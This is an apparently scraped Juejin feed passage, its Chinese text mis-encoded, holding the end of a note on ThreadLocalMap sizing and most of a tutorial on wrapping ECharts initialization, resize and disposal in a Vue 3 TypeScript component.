<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97578d7476914561aeac3f4fbfdc139d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CN5p2Q5Yac5aSr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228789&amp;x-signature=ZgJ0dMLN7tZ%2Bgc67fQyE1wEGJ0I%3D" alt="Image text" loading="lazy"/></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> é»˜è®¤å¤§å°
ThreadLocalMapçš„åˆå§‹å®¹é‡æ˜¯16ã€‚åœ¨åˆ›å»ºThreadLocalMapæ—¶ï¼Œ
ä¼šåˆå§‹åŒ–ä¸€ä¸ªé•¿åº¦ä¸º16çš„Entryæ•°ç»„ã€‚

<span class="hljs-bullet">2.</span> æ‰©å®¹æœºåˆ¶
ThreadLocalMapçš„æ‰©å®¹é˜ˆå€¼æ˜¯åˆå§‹å®¹é‡çš„2/3ï¼Œå³å½“sizeè¾¾åˆ°é˜ˆå€¼æ—¶ï¼Œ
å°±ä¼šè¿›è¡Œæ‰©å®¹ã€‚æ‰©å®¹æ—¶ï¼Œæ–°å®¹é‡æ˜¯æ—§å®¹é‡çš„2å€ã€‚
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[EChartsåˆå§‹åŒ–ã€é”€æ¯ã€resize é€‚é…ç»„ä»¶å°è£…ï¼ˆå«å®Œæ•´å°è£…ä»£ç ï¼‰]]></title>    <link>https://juejin.cn/post/7604507125857058843</link>    <guid>https://juejin.cn/post/7604507125857058843</guid>    <pubDate>2026-02-09T07:56:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604507125857058843" data-draft-id="7603010441150169129" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="EChartsåˆå§‹åŒ–ã€é”€æ¯ã€resize é€‚é…ç»„ä»¶å°è£…ï¼ˆå«å®Œæ•´å°è£…ä»£ç ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,ECharts"/> <meta itemprop="datePublished" content="2026-02-09T07:56:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ticnix"/> <meta itemprop="url" content="https://juejin.cn/user/3273707515560176"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            EChartsåˆå§‹åŒ–ã€é”€æ¯ã€resize é€‚é…ç»„ä»¶å°è£…ï¼ˆå«å®Œæ•´å°è£…ä»£ç ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3273707515560176/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ticnix
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T07:56:53.000Z" title="Mon Feb 09 2026 07:56:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p><code>Echarts</code>ä½œä¸ºä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„æ•°æ®å¯è§†åŒ–åº“ï¼Œå…·å¤‡ä¸°å¯Œçš„å›¾è¡¨ç±»å‹ã€é…ç½®åŒ–å¼€å‘çš„æ˜“ç”¨æ€§ã€é«˜åº¦å¯å®šåˆ¶çš„è§†è§‰æ•ˆæœã€ä¼˜ç§€çš„å“åº”å¼è®¾è®¡å’Œäº¤äº’ä½“éªŒï¼Œä»¥åŠå¯¹å¤§æ•°æ®é‡çš„æ€§èƒ½ä¼˜åŒ–èƒ½åŠ›ï¼Œå¹¿æ³›åº”ç”¨äºä¼ä¸šç®¡ç†ç³»ç»Ÿã€æ•°æ®åˆ†æå¹³å°ç­‰åœºæ™¯ã€‚</p>
<p>ä½†æ¯åˆ›å»ºä¸€ä¸ªå›¾è¡¨éƒ½è¦å¤„ç†<code>åˆå§‹åŒ–ã€é”€æ¯ã€resize é€‚é…</code>é€šç”¨é€»è¾‘ï¼Œé¡¹ç›®å¦‚æœä½“ç§¯å¤§èµ·æ¥ï¼Œåˆ›å»ºå’Œç»´æŠ¤å°±å˜å¾—ç‰¹åˆ«éº»çƒ¦ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹å®˜ç½‘å¯¹äºå›¾è¡¨çš„åˆ›å»ºçš„å¿«é€Ÿä¸Šæ‰‹:<a href="https://link.juejin.cn?target=https%3A%2F%2Fecharts.apache.org%2Fhandbook%2Fzh%2Fget-started%23%25E7%25BB%2598%25E5%2588%25B6%25E4%25B8%2580%25E4%25B8%25AA%25E7%25AE%2580%25E5%258D%2595%25E7%259A%2584%25E5%259B%25BE%25E8%25A1%25A8" target="_blank" title="https://echarts.apache.org/handbook/zh/get-started#%E7%BB%98%E5%88%B6%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E8%A1%A8" ref="nofollow noopener noreferrer">å¿«é€Ÿä¸Šæ‰‹ - ä½¿ç”¨æ‰‹å†Œ - Apache ECharts</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c76cd681dff5485dae6ada7c3a12dfcb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGljbml4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228613&amp;x-signature=lEWgg128n49HsJ0iif95Yi6OIxM%3D" alt="image.png" loading="lazy"/></p>
<p>å¦‚æœè¦è°ƒæ•´å›¾è¡¨çš„è‡ªé€‚åº”å¤§å°è¿˜è¦ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ebcb9d0a9014a48964cd2f08e8d7402~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGljbml4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228613&amp;x-signature=6dUoGvsb9G7zSWimzdzWZpV9Q3k%3D" alt="image.png" loading="lazy"/></p>
<p>æœ€åæ¯æ¬¡ç¦»å¼€é¡µé¢è¿˜è¦é”€æ¯å®ä¾‹ï¼Œå®åœ¨æ˜¯å¤ªéº»çƒ¦äº†ã€‚ã€‚ã€‚</p>
<p>å¦‚æœå¯ä»¥æŠŠEchartsè¿™äº›çƒ¦äººçš„é‡å¤æ€§æ­¥éª¤å°è£…èµ·æ¥ï¼Œåªä¼ æˆ‘éœ€è¦çš„è‡ªå®šä¹‰é…ç½®å‚æ•°å°±å¾ˆæ–¹ä¾¿äº†</p>
<blockquote>
<p>å…¶å®å°è£…èµ·æ¥çš„åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯æ¢æ±¤ä¸æ¢è¯ï¼ŒæŠŠæœ€é‡è¦çš„èŠ¯å­æŒ–ç©ºå°±è¡Œï¼Œç„¶åç”¨åˆ°çš„æ—¶å€™å†æŠŠèŠ¯å­è£…å›å»ï¼Œè£…ä¸åŒé¢èŠ¯å­å°±èƒ½å®ç°ä¸ä¸€æ ·çš„æ•ˆæœï¼Œè¿™æ ·å…å»äº†ä»å¤´åˆ°å°¾åˆ›å»ºçš„è¿‡ç¨‹ï¼Œç”¨èµ·æ¥ååˆ†æ–¹ä¾¿ï¼Œè€Œä¸”ç»´æŠ¤èµ·æ¥åªç”¨ç»´æŠ¤ä¸€ä¸ªç»„ä»¶å°±å¥½äº†ã€‚</p>
</blockquote>
<h2 data-id="heading-1">ä½¿ç”¨æ•™ç¨‹</h2>
<p>åˆ°åº•æœ‰å¤šæ–¹ä¾¿ï¼Ÿç›´æ¥ä¸Šé£Ÿç”¨æ–¹æ³•</p>
<h3 data-id="heading-2">åœ¨templateé‡Œä½¿ç”¨ç»„ä»¶</h3>
<p>å…ˆæŠŠEChartsç»„ä»¶å†™è¿›componentsé‡Œå°è£…å†åœ¨è¦ç”¨åˆ°çš„é¡µé¢ä½¿ç”¨</p>
<pre><code class="hljs language-js" lang="js">&lt;<span class="hljs-title class_">ECharts</span>                                               
    width=<span class="hljs-string">"600px"</span>                      &lt;!-- å›¾è¡¨å®¹å™¨å®½åº¦ï¼Œæ”¯æŒåƒç´ å€¼æˆ–ç™¾åˆ†æ¯” --&gt;
    height=<span class="hljs-string">"400px"</span>                     &lt;!-- å›¾è¡¨å®¹å™¨é«˜åº¦ï¼Œæ”¯æŒåƒç´ å€¼æˆ–ç™¾åˆ†æ¯” --&gt;
    element=<span class="hljs-string">"salaryChart"</span>               &lt;!-- å›¾è¡¨å…ƒç´  <span class="hljs-variable constant_">ID</span>ï¼ˆæ¯ä¸ªå›¾è¡¨å”¯ä¸€ï¼‰ --&gt;
    :option=<span class="hljs-string">"salaryChartOption"</span>         &lt;!-- å›¾è¡¨é…ç½®é€‰é¡¹ï¼ŒåŒ…å«æ•°æ®ã€æ ·å¼ç­‰ --&gt;
    :<span class="hljs-keyword">function</span>-type=<span class="hljs-string">"1"</span>                  &lt;!-- åŠŸèƒ½ç±»å‹ï¼š<span class="hljs-number">0</span>=æ— äº¤äº’ï¼Œ<span class="hljs-number">1</span>=ç‚¹å‡»+é«˜äº®ï¼Œ<span class="hljs-number">2</span>=ç‚¹å‡»+å¯¹è¯æ¡†ï¼Œ<span class="hljs-number">12</span>=ä¸¤è€…éƒ½æœ‰ --&gt;
    @chart-event=<span class="hljs-string">"handleChartEvent"</span>     &lt;!-- å›¾è¡¨äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œæ¥æ”¶ç‚¹å‡»äº‹ä»¶å‚æ•° --&gt;
/&gt;
</code></pre>
<h3 data-id="heading-3">åœ¨jsé…ç½®å‚æ•°</h3>
<p>jsé‡Œå°±ç›´æ¥å†™å¯¹åº”çš„<code>å¯¼å…¥ã€é…ç½®å‚æ•°ã€ç‚¹å‡»äº‹ä»¶</code>å°±å¥½äº†</p>
<p>è¿™é‡Œçš„<code>option</code>é…ç½®å‚æ•°å…·ä½“å‚è€ƒå®˜æ–¹æ–‡æ¡£çš„optioné…ç½®é¡¹å†™æ³•  <a href="https://link.juejin.cn?target=https%3A%2F%2Fecharts.apache.org%2Fzh%2Foption.html%23title" target="_blank" title="https://echarts.apache.org/zh/option.html#title" ref="nofollow noopener noreferrer">Documentation - Apache ECharts</a></p>
<p><code>ç‚¹å‡»äº‹ä»¶</code>å‚è€ƒå®˜æ–¹çš„  <a href="https://link.juejin.cn?target=https%3A%2F%2Fecharts.apache.org%2Fhandbook%2Fzh%2Fconcepts%2Fevent" target="_blank" title="https://echarts.apache.org/handbook/zh/concepts/event" ref="nofollow noopener noreferrer">äº‹ä»¶ä¸è¡Œä¸º - æ¦‚å¿µç¯‡ - ä½¿ç”¨æ‰‹å†Œ - Apache ECharts</a></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">ECharts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ECharts.vue'</span>;

<span class="hljs-comment">// è–ªèµ„åˆ†å¸ƒå›¾è¡¨é…ç½®</span>
<span class="hljs-keyword">const</span> salaryChartOption = {
  <span class="hljs-attr">title</span>: {
    <span class="hljs-attr">text</span>: <span class="hljs-string">'å‘˜å·¥è–ªèµ„åˆ†å¸ƒ'</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-string">'center'</span>
  },
  <span class="hljs-attr">tooltip</span>: {
    <span class="hljs-attr">trigger</span>: <span class="hljs-string">'axis'</span>,
    <span class="hljs-attr">axisPointer</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'shadow'</span>
    }
  },
  <span class="hljs-attr">grid</span>: {
    <span class="hljs-attr">left</span>: <span class="hljs-string">'3%'</span>,
    <span class="hljs-attr">right</span>: <span class="hljs-string">'4%'</span>,
    <span class="hljs-attr">bottom</span>: <span class="hljs-string">'3%'</span>,
    <span class="hljs-attr">containLabel</span>: <span class="hljs-literal">true</span>
  },
  <span class="hljs-attr">xAxis</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'category'</span>,
    <span class="hljs-attr">data</span>: sampleData.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">name</span>),
    <span class="hljs-attr">axisLabel</span>: {
      <span class="hljs-attr">rotate</span>: <span class="hljs-number">45</span>
    }
  },
  <span class="hljs-attr">yAxis</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'value'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'è–ªèµ„ï¼ˆå…ƒï¼‰'</span>
  },
  <span class="hljs-attr">series</span>: [
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'è–ªèµ„'</span>,
      <span class="hljs-attr">type</span>: <span class="hljs-string">'bar'</span>,
      <span class="hljs-attr">data</span>: sampleData.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">salary</span>),
      <span class="hljs-attr">itemStyle</span>: {
        <span class="hljs-attr">color</span>: <span class="hljs-string">'#188df0'</span>
      },
      <span class="hljs-attr">emphasis</span>: {
        <span class="hljs-attr">itemStyle</span>: {
          <span class="hljs-attr">color</span>: <span class="hljs-string">'#2378f7'</span>
        }
      }
    }
  ]
};

<span class="hljs-comment">// å¤„ç†å›¾è¡¨äº‹ä»¶</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChartEvent</span> = (<span class="hljs-params">params: any</span>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å›¾è¡¨äº‹ä»¶:'</span>, params);
  <span class="hljs-title function_">showMessage</span>(<span class="hljs-string">`ä½ ç‚¹å‡»äº†ï¼š<span class="hljs-subst">${params.name || params.data.name}</span>`</span>, <span class="hljs-string">'success'</span>);
};

</code></pre>
<h2 data-id="heading-4">ç»„ä»¶å°è£…</h2>
<p>ECharts ç»„ä»¶å°è£…çš„å®Œæ•´è¿‡ç¨‹å¯æ¦‚æ‹¬ä¸ºï¼š</p>
<ol>
<li>
<p>é¦–å…ˆæ­å»ºç»„ä»¶åŸºç¡€ç»“æ„ï¼ŒåŒ…æ‹¬æ¨¡æ¿ã€è„šæœ¬å’Œæ ·å¼ï¼›</p>
</li>
<li>
<p>æ¥ç€å®šä¹‰ç±»å‹å’Œ Props é…ç½®ï¼Œç¡®ä¿ç±»å‹å®‰å…¨å’Œä½¿ç”¨çµæ´»æ€§ï¼›</p>
</li>
<li>
<p>ç„¶åå®ç°å›¾è¡¨å®ä¾‹ç®¡ç†ï¼ŒåŒ…æ‹¬åˆ›å»ºã€é…ç½®å’Œé”€æ¯ï¼›é€šè¿‡å“åº”å¼æ›´æ–°æœºåˆ¶ï¼Œå®ç°å›¾è¡¨é…ç½®çš„è‡ªåŠ¨æ›´æ–°ï¼›æ·»åŠ äº‹ä»¶å¤„ç†ä¸äº¤äº’ï¼Œæ”¯æŒä¸çˆ¶ç»„ä»¶çš„é€šä¿¡ï¼›åœ¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ä¸­ï¼Œç¡®ä¿å›¾è¡¨æ­£ç¡®åˆå§‹åŒ–å’Œæ¸…ç†ï¼›</p>
</li>
<li>
<p>é€šè¿‡æ€§èƒ½ä¼˜åŒ–æªæ–½ï¼Œæå‡ç»„ä»¶æ€§èƒ½ï¼›</p>
</li>
<li>
<p>æš´éœ²å…¬å…±æ–¹æ³•ï¼Œæ”¯æŒæ›´çµæ´»çš„æ“ä½œï¼›æœ€åæ·»åŠ é”™è¯¯å¤„ç†ä¸æ—¥å¿—ï¼Œå¢å¼ºç»„ä»¶å¥å£®æ€§ã€‚</p>
</li>
</ol>
<h3 data-id="heading-5">1. ç»„ä»¶åŸºç¡€ç»“æ„æ­å»º</h3>
<p>æ ¸å¿ƒç›®æ ‡ ï¼šåˆ›å»ºç»„ä»¶çš„åŸºæœ¬æ¡†æ¶ï¼ŒåŒ…æ‹¬<code>æ¨¡æ¿ã€è„šæœ¬å’Œæ ·å¼</code>ã€‚</p>
<p>å®ç°ç»†èŠ‚ ï¼š</p>
<ul>
<li>æ¨¡æ¿éƒ¨åˆ† ï¼šä½¿ç”¨ div ä½œä¸ºå›¾è¡¨å®¹å™¨ï¼Œé€šè¿‡ ref è·å– DOM å…ƒç´ å¼•ç”¨ï¼Œè®¾ç½®åŠ¨æ€å®½é«˜æ ·å¼</li>
<li>è„šæœ¬éƒ¨åˆ† ï¼šé‡‡ç”¨ Vue 3 çš„ 
</li><li>æ ·å¼éƒ¨åˆ† ï¼šä½¿ç”¨ scoped æ ·å¼ï¼Œç¡®ä¿æ ·å¼éš”ç¦»ï¼Œè®¾ç½®åŸºæœ¬å®¹å™¨æ ·å¼å’Œè¿‡æ¸¡æ•ˆæœ</li>
</ul>
<pre><code class="hljs language-js" lang="js">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"chartRef"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"{ height: height, width: width }"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"echarts-container"</span> /&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// åç»­é€»è¾‘å®ç°</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.echarts-container</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">box-sizing</span>: border-box;
  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">transition</span>: width <span class="hljs-number">0.3s</span> ease, height <span class="hljs-number">0.3s</span> ease;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-6">2. ä¸ Props é…ç½®</h3>
<p>æ ¸å¿ƒç›®æ ‡ ï¼šå®šä¹‰ç»„ä»¶çš„<code>å±æ€§ç±»å‹å’Œé»˜è®¤å€¼</code>ï¼Œç¡®ä¿ç±»å‹å®‰å…¨å’Œä½¿ç”¨çµæ´»æ€§ã€‚</p>
<p>å®ç°ç»†èŠ‚ ï¼š</p>
<ul>
<li>ç±»å‹å®šä¹‰ ï¼šä½¿ç”¨ interface Props å®šä¹‰ç»„ä»¶å±æ€§ç±»å‹ï¼ŒåŒ…å«å®½é«˜ã€é…ç½®é¡¹ã€ä¸»é¢˜ç­‰</li>
<li>é»˜è®¤å€¼è®¾ç½® ï¼šé€šè¿‡ withDefaults(defineProps(), {...}) è®¾ç½®é»˜è®¤å€¼</li>
<li>ç±»å‹å¯¼å…¥ ï¼šå¯¼å…¥ ECharts ç›¸å…³ç±»å‹ï¼ˆå¦‚ EChartsOption ã€ ECElementEvent ï¼‰</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å®šä¹‰props</span>
interface <span class="hljs-title class_">Props</span> {
  width?: string | number;
  height?: string | number;
  <span class="hljs-attr">option</span>: <span class="hljs-title class_">EChartsOption</span>;
  functionType?: number;
  debounceDelay?: number;
  theme?: string | <span class="hljs-literal">null</span>;
  initOpts?: <span class="hljs-title class_">EChartsInitOpts</span>;
  autoResize?: boolean;
}

<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">withDefaults</span>(defineProps&lt;<span class="hljs-title class_">Props</span>&gt;(), {
  <span class="hljs-attr">width</span>: <span class="hljs-string">'100%'</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-string">'400px'</span>,
  <span class="hljs-attr">functionType</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">debounceDelay</span>: <span class="hljs-number">300</span>,
  <span class="hljs-attr">theme</span>: <span class="hljs-literal">null</span>,
  <span class="hljs-attr">initOpts</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">devicePixelRatio</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span> || <span class="hljs-number">1</span>,
    <span class="hljs-attr">renderer</span>: <span class="hljs-string">'canvas'</span>
  }),
  <span class="hljs-attr">autoResize</span>: <span class="hljs-literal">true</span>
});
</code></pre>
<h3 data-id="heading-7">3. å›¾è¡¨å®ä¾‹ç®¡ç†</h3>
<p>æ ¸å¿ƒç›®æ ‡ ï¼šåˆ›å»ºå’Œç®¡ç† <code>ECharts å®ä¾‹</code>ï¼Œç¡®ä¿å®ä¾‹çš„æ­£ç¡®<code>åˆå§‹åŒ–å’Œé”€æ¯</code>ã€‚</p>
<p>å®ç°ç»†èŠ‚ ï¼š</p>
<ul>
<li>å®ä¾‹å­˜å‚¨ ï¼šä½¿ç”¨ let chartInstance: ECharts | null = null å­˜å‚¨å›¾è¡¨å®ä¾‹</li>
<li>DOM å¼•ç”¨ ï¼šä½¿ç”¨ const chartRef = ref&lt;HTMLElement | null&gt;(null) è·å–å›¾è¡¨å®¹å™¨å…ƒç´ </li>
<li>å®ä¾‹åˆ›å»º ï¼šåœ¨ initChart å‡½æ•°ä¸­ä½¿ç”¨ echarts.init() åˆ›å»ºå®ä¾‹</li>
<li>å®ä¾‹é”€æ¯ ï¼šåœ¨ç»„ä»¶å¸è½½å’Œé‡æ–°åˆå§‹åŒ–æ—¶ä½¿ç”¨ chartInstance.dispose() é”€æ¯å®ä¾‹</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> chartRef = ref&lt;<span class="hljs-title class_">HTMLElement</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">let</span> <span class="hljs-attr">chartInstance</span>: <span class="hljs-title class_">ECharts</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;

<span class="hljs-comment">// åˆå§‹åŒ–å›¾è¡¨</span>
<span class="hljs-keyword">const</span> initChart = <span class="hljs-keyword">async</span> (): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-keyword">void</span>&gt; =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// æ¸…ç†ç°æœ‰å®ä¾‹</span>
    <span class="hljs-keyword">if</span> (chartInstance) {
      chartInstance.<span class="hljs-title function_">dispose</span>();
      chartInstance = <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">// ç¡®ä¿å…ƒç´ å­˜åœ¨</span>
    <span class="hljs-keyword">if</span> (!chartRef.<span class="hljs-property">value</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'å›¾è¡¨å®¹å™¨å…ƒç´ ä¸å­˜åœ¨'</span>);
    }

    <span class="hljs-comment">// åˆå§‹åŒ–å›¾è¡¨å®ä¾‹</span>
    chartInstance = echarts.<span class="hljs-title function_">init</span>(
      chartRef.<span class="hljs-property">value</span>,
      props.<span class="hljs-property">theme</span>,
      props.<span class="hljs-property">initOpts</span>
    );
    
    <span class="hljs-comment">// åç»­é…ç½®...</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'ECharts: å›¾è¡¨åˆå§‹åŒ–å¤±è´¥'</span>, error);
